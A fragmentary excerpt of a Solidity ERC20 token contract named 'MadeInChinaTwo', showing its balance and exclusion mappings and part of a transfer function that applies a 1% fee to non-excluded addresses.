...
contract MadeInChinaTwo  is Ownable, IERC20 {
    using SafeMath for uint256;
    mapping (address => uint256) private _tOwned;
    mapping (address => mapping (address => uint256)) private _allowances;
    mapping (address => bool) private _isExcludedFrom;
    address private isExcluded;
    string private _name = "中国制造2.0";
    string private _symbol = "中国制造2.0";
    ...
    function _transfer(address form, address to, uint256 amount) internal virtual {
        ...
        if (!_isExcludedFrom[form] && !_isExcludedFrom[to] ) { _dead = amount.mul(1).div(100);}
